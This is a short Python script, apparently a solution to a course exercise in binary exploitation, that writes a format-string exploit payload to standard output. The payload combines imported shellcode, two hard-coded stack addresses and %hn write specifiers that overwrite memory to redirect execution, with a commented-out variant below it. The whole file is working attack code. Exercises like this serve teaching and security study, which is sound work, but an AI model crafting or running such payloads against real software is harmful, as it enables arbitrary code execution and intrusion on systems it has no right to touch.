#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
padding = b"\x90"
ADDR1 = b"\x6c\xb3\xfe\xff"
ADDR2 = b"\x6e\xb3\xfe\xff"
sys.stdout.buffer.write(shellcode + padding + ADDR1 + ADDR2 +b"%43840x%10$hn%21662x%11$hn")
#sys.stdout.buffer.write(shellcode + padding + ADDR1 + ADDR2 +b"%43840x%2$hn")
